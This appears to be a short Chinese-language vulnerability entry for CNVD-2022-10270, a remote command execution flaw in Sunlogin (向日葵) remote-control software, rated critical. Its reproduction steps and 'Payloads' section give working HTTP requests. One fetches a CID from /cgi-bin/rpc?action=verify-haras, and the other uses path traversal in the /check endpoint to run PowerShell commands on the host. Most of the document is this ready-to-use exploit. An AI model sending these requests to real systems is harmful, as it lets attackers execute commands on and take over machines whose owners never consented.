# 向日葵 check 远程命令执行漏洞 CNVD-2022-10270

## 漏洞描述
向日葵通过发送特定的请求获取CID后，可调用 check接口实现远程命令执行，导致服务器权限被获取

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
向日葵在开启后会默认在 40000-65535 之间开启某端口

![image-20220524135408561](images/202205241354598.png)

发送请求获取CID

```
/cgi-bin/rpc?action=verify-haras
```


## Payloads
```
/cgi-bin/rpc?action=verify-haras
```
```
/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+ipconfig
```
